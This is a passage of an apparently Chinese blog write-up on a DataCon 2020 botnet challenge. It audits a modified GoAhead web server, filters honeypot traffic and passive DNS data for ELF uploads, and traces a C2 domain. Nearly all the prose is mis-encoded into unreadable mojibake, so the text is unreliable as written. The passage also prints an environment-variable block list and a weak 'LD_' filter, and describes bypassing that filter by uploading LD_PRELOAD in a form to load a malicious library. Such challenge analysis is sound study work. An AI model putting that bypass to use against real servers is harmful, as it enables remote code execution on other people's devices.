class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=<span class="number">1001</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ç»™çš„100ä¸ªåŸŸåéƒ½åœ¨æˆ‘ä»¬ç”Ÿæˆçš„åŸŸåé‡Œï¼Œè¯æ˜ç­”æ¡ˆæ— è¯¯ã€‚</p><h1 id="åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿"><a href="#åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿" class="headerlink" title="åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿"></a>åƒµå°¸ç½‘ç»œåˆ†æé¢˜ç›®ä¸€-Botnetè¿½è¸ªâ€”è¿½åˆ°æˆ‘å°±è®©ä½ å˜¿å˜¿å˜¿</h1><p>è¿™ä¸ªé¢˜æˆ‘è¯„ä¼°åå‡ºé¢˜äººæ ¹æ®æˆ‘çš„åé¦ˆï¼Œå¯¹é¢˜ç›®åšäº†ä¸€å®šçš„è°ƒæ•´ã€‚</p><h2 id="èµ›é¢˜ä¿¡æ¯-1"><a href="#èµ›é¢˜ä¿¡æ¯-1" class="headerlink" title="èµ›é¢˜ä¿¡æ¯"></a>èµ›é¢˜ä¿¡æ¯</h2><h3 id="è®¾è®¡è¯´æ˜-1"><a href="#è®¾è®¡è¯´æ˜-1" class="headerlink" title="è®¾è®¡è¯´æ˜"></a>è®¾è®¡è¯´æ˜</h3><p>Datacon softwareæ˜¯ä¸€å®¶ä»¥IOTäº§å“å¼€å‘ä¸ºä¸»è¦ä¸šåŠ¡çš„å…¬å¸ï¼Œä»–ä»¬åœ¨å¼€æºWeb server GoAheadçš„åŸºç¡€ä¸Šå®šåˆ¶äº†ä¸€æ¬¾åä¸ºXGoAheadçš„Web serverä½¿ç”¨åœ¨è‡ªå·±çš„äº§å“ä¸­ã€‚æŸå¤©Datacon softwareæ”¶åˆ°å¤–éƒ¨æƒ…æŠ¥åé¦ˆï¼šå…¶å®šåˆ¶å¼€å‘çš„XGoAheadç–‘ä¼¼å­˜åœ¨æ¼æ´ï¼Œä¸”å·²é­åˆ°åƒµå°¸ç½‘ç»œåˆ©ç”¨ã€‚ç°åœ¨ä½ çš„ä»»åŠ¡æ˜¯æ‰¾åˆ°è¿™ä¸ªåƒµå°¸ç½‘ç»œçš„C2åŸŸåã€‚</p><h3 id="ä»£ç ä¸æ•°æ®è¯´æ˜"><a href="#ä»£ç ä¸æ•°æ®è¯´æ˜" class="headerlink" title="ä»£ç ä¸æ•°æ®è¯´æ˜"></a>ä»£ç ä¸æ•°æ®è¯´æ˜</h3><p>ç›®å‰å·²çŸ¥çš„çº¿ç´¢å¦‚ä¸‹</p><ul><li>XGoAheadæœ€æ–°ç‰ˆæœ¬æºç </li><li>XGoAheadæœ€æ–°ç‰ˆæœ¬æºç </li><li>Passive DNSæ•°æ®</li></ul><p>æä¾›çš„XGoAheadè½¯ä»¶ä»£ç åªèƒ½è¿è¡Œåœ¨Linuxæ“ä½œç³»ç»Ÿä¸Šä¸”é¡»ä½¿ç”¨makeå·¥å…·æ„å»ºï¼Œæ¨èä½¿ç”¨Ubuntu 18.04 x86_64æˆ–Centos 7 x86_64ï¼Œä¸æ¨èåœ¨å…¶ä»–ç³»ç»Ÿ/å¹³å°ä¸Šä½¿ç”¨ã€‚</p><p>æä¾›çš„å…¬ç½‘Webèœœç½æ•°æ®ä»…ä¸ºèœœç½æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ¥è‡ªå…¬ç½‘çš„æµé‡ï¼Œè¿œä¸èƒ½è¦†ç›–æ•´ä¸ªäº’è”ç½‘çš„æƒ…å†µï¼Œä»…ä¸ºè§‚æµ‹æ ·æœ¬ã€‚</p><p>æä¾›çš„Passive DNSä»…ä¸ºå°èŒƒå›´Client IPçš„æ•°æ®ï¼Œè¿œä¸èƒ½è¦†ç›–æ•´ä¸ªäº’è”ç½‘çš„æƒ…å†µï¼Œä»…ä¸ºè§‚æµ‹æ ·æœ¬ã€‚</p><h3 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h3><ul><li>Webèœœç½æ•°æ®</li></ul><p>è¯¥æ•°æ®ä½äºå‹ç¼©åŒ…ä¸­çš„honeypot.jsonæ–‡ä»¶ï¼Œå…¶æ¥æºäºå…¬ç½‘éƒ¨ç½²çš„Webèœœç½ï¼Œæ•°æ®é‡‡é›†çš„æ—¶é—´èŒƒå›´æ˜¯2020å¹´5æœˆã€‚æ–‡ä»¶ä¸­æ¯ä¸€è¡Œä¸ºä¸€ä¸ªJSONå­—ç¬¦ä¸²ï¼Œä»£è¡¨ä¸€æ¡èœœç½æ—¥å¿—ï¼Œå³é’ˆå¯¹èœœç½çš„ä¸€æ¬¡HTTPè¯·æ±‚ï¼Œè¯¦ç»†å­—æ®µè§£é‡Šå¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>eventid</td><td>äº‹ä»¶ç±»å‹ï¼Œæ•°æ®æ–‡ä»¶ä¸­å‡ä¸ºâ€œattack.webâ€</td></tr><tr><td>method</td><td>HTTP method</td></tr><tr><td>body</td><td>HTTP body</td></tr><tr><td>url</td><td>HTTP request URL</td></tr><tr><td>header</td><td>HTTP request headers</td></tr><tr><td>path</td><td>HTTP request path</td></tr><tr><td>protocol</td><td>åº”ç”¨å±‚åè®®ï¼Œæ•°æ®æ–‡ä»¶ä¸­å‡ä¸ºâ€œhttpâ€</td></tr><tr><td>src_ip</td><td>æºIPåœ°å€ï¼ˆå·²åŠ ç›å“ˆå¸Œå¤„ç†ï¼‰</td></tr><tr><td>src_port</td><td>æºç«¯å£</td></tr><tr><td>dst_port</td><td>ç›®çš„ç«¯å£</td></tr><tr><td>timestamp</td><td>æ•°æ®æ•è·çš„æ—¶é—´ï¼ˆæ ¼æ—å°¼æ²»æ—¶é—´ï¼‰</td></tr></tbody></table><ul><li>Passive DNS æ•°æ®</li></ul><p>è¯¥æ•°æ®ä½äºaccess.cvsä¸­ï¼Œè¯¥æ•°æ®è¡¨ç¤ºDNSè¯·æ±‚è®°å½•ï¼Œå³DNSå®¢æˆ·ç«¯IPè¯·æ±‚è§£æçš„åŸŸåè®°å½•ã€‚è¯¥æ•°æ®é‡‡é›†äº2020å¹´5æœˆçš„æŸä¸€å¤©ã€‚æ ¼å¼ä¸ºCSVï¼Œæ¯è¡Œä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸ºâ€œåŸŸåâ€ã€â€œå®¢æˆ·ç«¯IPï¼ˆå·²åŠ ç›å“ˆå¸Œå¤„ç†ï¼‰â€ã€â€œä¸€å°æ—¶å†…çš„è¯·æ±‚æ¬¡æ•°â€ï¼Œè¯·æ±‚æ—¶é—´å·²å»é™¤ï¼ˆè„±æ•ï¼‰ã€‚</p><h3 id="æäº¤å½¢å¼-1"><a href="#æäº¤å½¢å¼-1" class="headerlink" title="æäº¤å½¢å¼"></a>æäº¤å½¢å¼</h3><p>é¢˜ç›®ä¿®æ”¹å‰æäº¤å†…å®¹ï¼š</p><ul><li>å¯èƒ½åˆ©ç”¨XGoAheadæ¼æ´çš„åƒµå°¸ç½‘ç»œçš„C2åŸŸå</li></ul><p>ç­”æ¡ˆé€šè¿‡æ–‡æœ¬æ–‡ä»¶æäº¤ï¼Œå¦‚æœæ‰¾åˆ°äº†å¤šä¸ªC2åŸŸååˆ™ä¸€è¡Œä¸€ä¸ªC2åŸŸåã€‚æ–‡ä»¶ä½¿ç”¨ASCIIç¼–ç ï¼Œæ¢è¡Œç¬¦ä¸ºâ€œ\nâ€ï¼Œæ–‡ä»¶æœ«å°¾ç•™ä¸€ä¸ªç©ºè¡Œã€‚</p><ul><li>XGoAheadä¸­æ¼æ´æ‰€åœ¨çš„æ–‡ä»¶åå’Œå‡½æ•°åï¼ˆå¦‚æœXGoAheadå­˜åœ¨æ¼æ´åˆ™éœ€è¦æäº¤è¯¥ç­”æ¡ˆï¼‰</li></ul><p>é€šè¿‡æ–‡æœ¬æ–‡ä»¶æäº¤ï¼Œæ ¼å¼ä¸ºâ€œæ–‡ä»¶å:å‡½æ•°åâ€ï¼ˆå†’å·ä¸ºè‹±æ–‡å†’å·ï¼Œå¤§å°å†™æ•æ„Ÿï¼‰ï¼Œå¦‚å­˜åœ¨å¤šä¸ªæ¼æ´åˆ™ä¸€è¡Œä¸€ä¸ªæ¼æ´ï¼Œæ¢è¡Œç¬¦ä¸ºâ€œ\nâ€ï¼Œæ–‡ä»¶æœ«å°¾ç•™ä¸€ä¸ªç©ºè¡Œã€‚</p><p>é¢˜ç›®ä¿®æ”¹åæäº¤å†…å®¹ï¼š</p><ul><li>æäº¤å¯èƒ½æ„ŸæŸ“åƒµå°¸ç½‘ç»œçš„IP</li></ul><h2 id="è§£é¢˜è¿‡ç¨‹-1"><a href="#è§£é¢˜è¿‡ç¨‹-1" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>å…ˆè®²ä¸‹å½“æ—¶åšé¢˜çš„è¿‡ç¨‹ã€‚</p><p>é¢˜ç›®è¦æ±‚æ‰¾åˆ°è¿™ä¸ªåƒµå°¸ç½‘ç»œçš„C2åŸŸåï¼Œå¹¶æ‰¾å‡º xgoahead æ¼æ´ç‚¹ã€‚</p><p>åšé¢˜æ€è·¯åº”è¯¥å¤§è‡´æ˜¯è¿™æ ·</p><ol><li>æºç å®¡è®¡ï¼Œæ‰¾å‡ºæ¼æ´ç‚¹</li><li>æ ¹æ®æ¼æ´ï¼Œä»èœœç½æµé‡ä¸­æ‰¾å‡ºæ”»å‡»æµé‡</li><li>æ ¹æ®æ”»å‡»æµé‡çš„æºIPï¼Œåœ¨ passive dns ä¸­æ‰¾å‡º C2 åŸŸåã€‚</li></ol><h3 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h3><p>æ—¢ç„¶æ˜¯åŸºäº goahead æ”¹çš„ï¼Œå…ˆæŠŠ goahead æºç æ‹‰ä¸‹æ¥ diff ä¸€ä¸‹ã€‚goahead ç½‘ä¸Šçš„æºç ä¸‹è½½é“¾æ¥å¤§å¤šæŒ‚äº†ï¼Œgithubä¹Ÿæ²¡äº†ï¼Œåœ¨è¿™é‡Œä¸‹åˆ°äº† 4.1.3 çš„æºç ï¼š<a href="https://www.embedthis.com/goahead/download.html">https://www.embedthis.com/goahead/download.html</a></p><p>æ‹‰ä¸‹æ¥ diff ä¸€ä¸‹ã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200723111342633.png" alt="image-20200723111342633"></p><p>ä¸»è¦çš„æ”¹åŠ¨å°±æ˜¯å¢åŠ äº†ä¸€ä¸ª xcgiï¼Œè¿™ä¸ª xcgi çœ‹èµ·æ¥è·Ÿ cgi åŠŸèƒ½å·®ä¸å¤šã€‚å…¶ä»–æ²¡å•¥è‡ªå·±å†™çš„åŠŸèƒ½ä»£ç ï¼Œæœä¸€æ³¢ goahead çš„æ¼æ´ï¼š</p><p>CVE-2019-5096 æœ‰ä¸ªRCEï¼Œå‚è€ƒ <a href="https://www.anquanke.com/post/id/194322">https://www.anquanke.com/post/id/194322</a>ï¼Œä¸è¿‡ xgoahead å·²ç»ä¿®å¤äº†ã€‚</p><p>CVE-2017-17562 æœ‰ä¸ª cgi çš„ RCEï¼Œå‚è€ƒ <a href="https://xz.aliyun.com/t/6407#toc-2">https://xz.aliyun.com/t/6407#toc-2</a>ï¼Œ xgoahead ä¹Ÿä¿®å¤äº†ï¼Œæ˜¯å®˜æ–¹çš„è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">envp = walloc(envpsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line"><span class="keyword">if</span> (wp-&gt;vars) &#123;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>, s = hashFirst(wp-&gt;vars); s != <span class="literal">NULL</span>; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;content.valid &amp;&amp; s-&gt;content.type == <span class="built_in">string</span>) &#123;</span><br><span class="line">            vp = strim(s-&gt;name.value.<span class="built_in">string</span>, <span class="number">0</span>, WEBS_TRIM_START);</span><br><span class="line">            <span class="keyword">if</span> (smatch(vp, <span class="string">&quot;REMOTE_HOST&quot;</span>) || smatch(vp, <span class="string">&quot;HTTP_AUTHORIZATION&quot;</span>) ||</span><br><span class="line">                smatch(vp, <span class="string">&quot;IFS&quot;</span>) || smatch(vp, <span class="string">&quot;CDPATH&quot;</span>) ||</span><br><span class="line">                smatch(vp, <span class="string">&quot;PATH&quot;</span>) || sstarts(vp, <span class="string">&quot;LD_&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;arg != <span class="number">0</span> &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">                envp[n++] = sfmt(<span class="string">&quot;%s%s=%s&quot;</span>, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.value.<span class="built_in">string</span>,</span><br><span class="line">                    s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                envp[n++] = sfmt(<span class="string">&quot;%s=%s&quot;</span>, s-&gt;name.value.<span class="built_in">string</span>, s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            trace(<span class="number">0</span>, <span class="string">&quot;Env[%d] %s&quot;</span>, n, envp[n<span class="number">-1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (n &gt;= envpsize) &#123;</span><br><span class="line">                envpsize *= <span class="number">2</span>;</span><br><span class="line">                envp = wrealloc(envp, envpsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ äº†è¿‡æ»¤ã€‚</p><p>ä½†æ˜¯ xcgi æ²¡æœ‰è¿™ä¹ˆä¸¥æ ¼çš„è¿‡æ»¤ï¼Œåªè¿‡æ»¤äº† LD_:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Check if request is safe.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">beSafe</span><span class="params">(Webs *wp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;query != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(wp-&gt;query, <span class="string">&quot;LD_&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯æ¼æ´ç‚¹ã€‚ï¼ˆ<del>å¹¶ä¸çŸ¥é“å¦‚ä½• bypass</del>ï¼‰</p><p>è·Ÿé‚£ä¸ªæ¼æ´ï¼Œè¿˜å‘ç°ä¸€å¤„å¥‡æ€ªçš„åœ°æ–¹:</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152238069.png" alt="image-20200723152238069"></p><p>Xgoahead å¯¹ä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åå¤„ç†ï¼ŒæŠŠ count++ å–æ¶ˆäº†ï¼Œé‚£ä¸€ç›´éƒ½æ˜¯åªèƒ½å†™é‚£ä¸€ä¸ªæ–‡ä»¶ã€‚</p><h3 id="æ•°æ®åˆ†æ"><a href="#æ•°æ®åˆ†æ" class="headerlink" title="æ•°æ®åˆ†æ"></a>æ•°æ®åˆ†æ</h3><p>æ•°æ®é‡è¾ƒå¤§ï¼Œåšåˆ†æå¤„ç†æ¯”è¾ƒéº»çƒ¦ï¼Œè€ƒè™‘å¯¼å…¥æ•°æ®åº“ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚è¯•äº†å¾ˆå¤šç§æ–¹æ³•ï¼Œæœ€åè¿˜æ˜¯ç”¨ Python è§£ææ•°æ®å†å…¥åº“ã€‚</p><p>å€’å…¥æ•°æ®åº“è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db = pymysql.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;datacon&quot;</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">path1 = <span class="string">&quot;access.csv&quot;</span></span><br><span class="line">sql = <span class="string">&#x27;INSERT INTO access(id,domain,ip_hash,times) VALUES (%s,%s,%s,%s)&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = <span class="number">1</span></span><br><span class="line">error = <span class="number">0</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path1, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line_data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> line_data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                domain,ip_hash,times = line_data.strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="built_in">id</span>,line_data.strip().split(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">                error += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp.append((<span class="built_in">id</span>,domain,ip_hash,<span class="built_in">int</span>(times)))</span><br><span class="line">            <span class="built_in">id</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cursor.executemany(sql, tmp)</span><br><span class="line">                db.commit()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">id</span> % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cursor.executemany(sql, tmp)</span><br><span class="line">                db.commit()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">            tmp = []</span><br><span class="line">print(error)</span><br></pre></td></tr></table></figure><p>å¤„ç†æ•°æ®æ—¶ï¼ŒAccess.csv éƒ¨åˆ†æ•°æ®æœ‰äº›é—®é¢˜ï¼Œå¦‚6416è¡Œï¼Œ217333è¡Œï¼Œç›´æ¥è·³è¿‡å¤„ç†äº†ï¼Œè¿˜ä¸å°‘ï¼Œå¤§éƒ¨åˆ†æ˜¯å¤šäº†è¯·æ±‚çš„ipã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200722223835665.png" alt="image-20200722223835665"></p><p>ç»å¤§éƒ¨åˆ†è¯·æ±‚ipéƒ½æ˜¯ cfda2160b0298e40a2d3fbe79e8d309aï¼Œæ„Ÿè§‰å¯¹åšé¢˜æ²¡å•¥å½±å“ï¼Œå› ä¸ºèœœç½æ•°æ®é‡Œæ ¹æœ¬å°±æ²¡æœ‰è¿™ä¸ªipã€‚</p><p>å¯¼å…¥åº“åï¼Œå¤§ä½“è§‚å¯Ÿä¸€ä¸‹ï¼Œå¯»æ‰¾æ¼æ´ç‰¹å¾ã€‚</p><p>å¦‚æœåˆ©ç”¨ xcgi é‚£ä¸ªæ¼æ´ï¼ŒæŒ‰ç…§ xgoahead æºç çš„è·¯ç”±ï¼Œè¦è®¿é—® /xcgiï¼Œä¸è¿‡æ²¡å‘ç°è¿™æ ·çš„æµé‡ã€‚éœ€è¦ä¸Šä¼ æ¶æ„ so æ–‡ä»¶ï¼Œæµé‡é‡Œä¹Ÿæœ‰ä¼  elf çš„ã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152421269.png" alt="image-20200723152421269"></p><p>ï¼ˆä¸è¿‡å‘ç°æœ‰çš„ elf æ‹–ä¸‹æ¥é€†å‘åˆ†æï¼Œæ²¡å•¥æ¶æ„è¡Œä¸ºï¼‰</p><p>çœ‹ä¸€ä¸‹æœ‰å¤šå°‘ ip å‘å‡ºäº†ä¸Šä¼  so çš„è¯·æ±‚ï¼š</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152527842.png" alt="image-20200723152527842"></p><p>å‘ç°æ˜¯ 65 ä¸ªï¼Œå¯ä»¥æŠŠè¿™äº› ip æ‹¿å‡ºæ¥ï¼Œå» access.csv çœ‹ä¸€ä¸‹è¿™äº› ip çš„ dnsè¯·æ±‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db = pymysql.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;datacon&quot;</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">&quot;select distinct src_ip from honeypot  where locate(&#x27;7fELF&#x27;,body)&gt;0&quot;</span>)</span><br><span class="line">elf_ip = []</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">    elf_ip.append(data[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> elf_ip:</span><br><span class="line">    cursor.execute(<span class="string">&quot;select distinct domain from access where ip_hash=&#x27;%s&#x27;&quot;</span>%ip)</span><br><span class="line">    print(cursor.fetchall())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç° passivedns ä¸­åªæœ‰å…¶ä¸­ä¸¤ä¸ª ip çš„è®°å½• ï¼š 625210b633ed23166798790a3180b6dc ä¸ eef5239efd6c7cc9f2e08f4a6f45d76bã€‚çœ‹äº†ä¸‹èœœç½æµé‡ï¼Œä¸¤ä¸ª ip éƒ½æ˜¯åªæœ‰ä¸€æ¡è®°å½•ï¼Œä¸Šä¼ çš„ elf æ‹–ä¸‹æ¥çœ‹äº†ä¸‹ä¹Ÿæ˜¯æ¶æ„çš„ï¼š</p><p><img src="/2020/08/16/2020-Datacon/image-20200723165321651.png" alt="image-20200723165321651"></p><p>è€Œä¸”æ–‡ä»¶åæœ‰ <code>tmp/tmp-0.tmp</code>ï¼Œå’Œä¹‹å‰ä¿®æ”¹çš„é‚£éƒ¨åˆ†ä»£ç å¯ä»¥å¯¹åº”ä¸Šã€‚</p><p>çœ‹èµ·æ¥è¿™ä¸¤ä¸ª ip è¿˜è¯·æ±‚äº†ä¸å°‘æ­£å¸¸çš„åŸŸåï¼ŒC2 åŸŸååº”è¯¥æ˜¯å…¬å…±çš„å§ï¼ŒæŠŠè¿™ä¸¤ä¸ª ip è¯·æ±‚çš„åŸŸåå–ä¸‹äº¤é›†ï¼Œäººå·¥çœ‹ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª .ga åç¼€çš„åŸŸåï¼Œè¿™ä¸ªåŸŸåå°±æ˜¯æœ€ç»ˆçš„C2åŸŸåã€‚</p><p>PSï¼šæµé‡é‡Œ bypass è¿‡æ»¤çš„æ–¹æ³•æ˜¯æŠŠ LD_PRELOAD æ”¾åˆ°è¡¨å•é‡Œä¸Šä¼ ã€‚</p><h2 id="é¢˜ç›®ä¿®æ”¹"><a href="#é¢˜ç›®ä¿®æ”¹" class="headerlink" title="é¢˜ç›®ä¿®æ”¹"></a>é¢˜ç›®ä¿®æ”¹</h2><p>å‡ºé¢˜äººæœ¬æ„æ˜¯æƒ³è®©é€‰æ‰‹å…ˆåˆ†æå¤„æ¼æ´bypassçš„åˆ©ç”¨æ–¹å¼ï¼Œå†é€šè¿‡expæ‰¾æ”»å‡»è¿‡æµé‡ï¼Œæœ€åæ‰¾C2åŸŸåã€‚æ˜¾ç„¶æˆ‘çš„æ–¹æ³•å±äºæŠŠç­”æ¡ˆå·äº†å‡ºæ¥ã€‚ä¸€æ³¢è®¨è®ºå‡ºé¢˜äººå¯¹é¢˜ç›®è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ï¼š</p><ol><li>æäº¤å†…å®¹æ”¹æˆäº†å¯èƒ½å—æ„ŸæŸ“çš„IPã€‚</li><li>xgoaheadä»£ç è¿›è¡Œäº†è°ƒæ•´ï¼ŒæŠŠ count++ é‚£å—çš„ä¿®æ”¹ç§»é™¤äº†ï¼ˆå¤ªåˆ»æ„äº†ï¼‰ï¼Œå¢å¤§é€‰æ‰‹åˆ†æéš¾åº¦ã€‚</li><li>ä¹‹å‰æˆ‘æŠŠæ‰€æœ‰ä¸Šä¼ elfçš„ipéƒ½å» passivedns æŸ¥äº†ä¸ªéï¼Œæœ‰dnsè®°å½•çš„ipå°±æ˜¯æ”»å‡»ipï¼Œå‡ºé¢˜äººè¿™æ¬¡æŠŠæµé‡ä¸­çš„æ”»å‡»ipå¢åŠ äº†ä¸¤ä¸ªï¼ŒåŒæ—¶ dns ä¸­è¿˜æ²¡æœ‰ç›¸åº”è¯·æ±‚è®°å½•ã€‚ä¸è¿‡å¯ä»¥æŒ‰ç…§æˆ‘åŸæ¥çš„æ–¹æ³•æ‰¾åˆ°é‚£ä¸¤ä¸ªipï¼Œå›è¿‡å¤´åˆ†ææµé‡ä¸­expç‰¹å¾ï¼Œå†ç­›é€‰è¿™æ ·å°±å¯ä»¥æ‰¾å‡ºå…¨éƒ¨çš„å››ä¸ªipäº†ï¼Œæ‰€ä»¥å‡ºé¢˜äººæœ€ååº”è¯¥æ˜¯åœ¨passivednsä¸­åˆ é™¤äº†è¿™å››ä¸ªipçš„è¯·æ±‚è®°å½•ã€‚</li><li>å¯¹æµé‡ä¸­ä¸Šä¼ çš„ elf åšäº†äº›æ–‡ç« ï¼Œé€‰æ‰‹éœ€è¦å»åˆ†ææ¶æ„elfçš„è¡Œä¸ºï¼Œä»è€Œé€šè¿‡ passivedns 